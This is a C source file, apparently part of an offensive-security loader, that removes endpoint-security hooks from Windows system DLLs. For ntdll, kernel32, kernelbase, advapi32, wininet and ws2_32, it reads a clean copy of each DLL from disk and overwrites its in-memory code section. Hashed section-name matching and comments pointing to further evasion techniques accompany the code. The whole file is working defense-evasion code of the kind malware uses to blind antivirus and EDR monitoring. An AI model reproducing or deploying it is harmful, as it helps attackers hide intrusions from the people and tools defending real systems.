#include "Unhook.h"

HANDLE      hProcess = (HANDLE)-1;
MODULEINFO  mi       = { 0 };

// Load Some Dll Here ... :)
HMODULE LoadTargetModule(PWin32Api win32Api,PCWSTR pszDllName)
{
	UNICODE_STRING		usDllPath	= {0};
	HMODULE				hModule		= NULL;

	_RtlInitUnicodeString(&usDllPath, pszDllName);
	win32Api->pfnLdrLoadDll(NULL, NULL, &usDllPath, &hModule);
	return hModule;
}

// UnHook TargetModule 
VOID UnHookTargetModule(PWin32Api win32Api, PCWSTR pszDllName)
{
    ULONG               ulOldProtection = 0;
    SIZE_T              stTextSize      = 0;
    HMODULE             hModule         = NULL;
    PVOID               pvTextSection   = NULL;
    LPVOID              pvDllBase       = NULL;
    LPVOID              pvMapAddr       = NULL;
    HANDLE              hFile           = INVALID_HANDLE_VALUE;
    HANDLE              hMapping        = INVALID_HANDLE_VALUE;
    PIMAGE_DOS_HEADER   pImgDosHead     = NULL;
    PIMAGE_NT_HEADERS   pImgNtHead      = NULL;

    // Oops We Use GetModuleHandleW here , What About Walk PEB ? 
    hModule             = win32Api->pfnGetModuleHandleW(pszDllName);
    hFile               = win32Api->pfnCreateFileW(pszDllName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    hMapping            = win32Api->pfnCreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    pvMapAddr           = win32Api->pfnMapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

    GetModuleInformation(hProcess, hModule, &mi, sizeof(mi));
    pvDllBase = (LPVOID)mi.lpBaseOfDll;

    pImgDosHead         = (PIMAGE_DOS_HEADER)pvDllBase;
    pImgNtHead          = (PIMAGE_NT_HEADERS)((ULONG_PTR)pvDllBase + pImgDosHead->e_lfanew);

    for (WORD i = 0; i < pImgNtHead->FileHeader.NumberOfSections; i++) 
    {
        PIMAGE_SECTION_HEADER pImgSecHead = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(pImgNtHead) + ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (HASHa((char*)pImgSecHead->Name) == TEXTSECTIONHASH) 
        {
			stTextSize      = pImgSecHead->Misc.VirtualSize; 
            pvTextSection   = ((ULONG_PTR)pvDllBase + pImgSecHead->VirtualAddress);    // Oops What About Try AtomLdr :)
            win32Api->pfnNtProtectVirtualMemory((HANDLE)-1,&pvTextSection,&stTextSize, PAGE_EXECUTE_READWRITE, &ulOldProtection);
            _memcpy((LPVOID)((ULONG_PTR)pvDllBase + pImgSecHead->VirtualAddress), (LPVOID)((ULONG_PTR)pvMapAddr + pImgSecHead->VirtualAddress), pImgSecHead->Misc.VirtualSize);
            win32Api->pfnNtProtectVirtualMemory((HANDLE)-1,&pvTextSection, &stTextSize, ulOldProtection, &ulOldProtection);
            break;
        }
    }
   
    win32Api->pfnCloseHandle(hFile);
    win32Api->pfnCloseHandle(hMapping);
    win32Api->pfnUnmapViewOfFile(pvMapAddr);
}

#define LOAD_MODULE(api, name) \
    if (!LoadTargetModule((api), (name))) return FALSE;

BOOL Preload(PWin32Api win32Api)
{
    LOAD_MODULE(win32Api, WS2_32);
    LOAD_MODULE(win32Api, WININET);
    LOAD_MODULE(win32Api, ADVAPI32);
    LOAD_MODULE(win32Api, KERNELBASE);

	return TRUE;
}

VOID UnHookAll(PWin32Api win32Api)
{
    // Here goes A series Module 
	UnHookTargetModule(win32Api, NTDLL);
	UnHookTargetModule(win32Api, KERNEL32);
	UnHookTargetModule(win32Api, KERNELBASE);
	UnHookTargetModule(win32Api, ADVAPI32);
	UnHookTargetModule(win32Api, WININET);
	UnHookTargetModule(win32Api, WS2_32);
}

BOOL UnHook(PWin32Api win32Api)
{
	printf("[+] Trying To UnHook ....\n");
	BOOL bRet = FALSE;
	if (!Preload(win32Api))
		goto _CleanUp;

	// Let's Take A Deep Breath :)
	win32Api->pfnSleep(0x1000);
  
    UnHookAll(win32Api);

	bRet = TRUE;
_CleanUp:
	return bRet;
}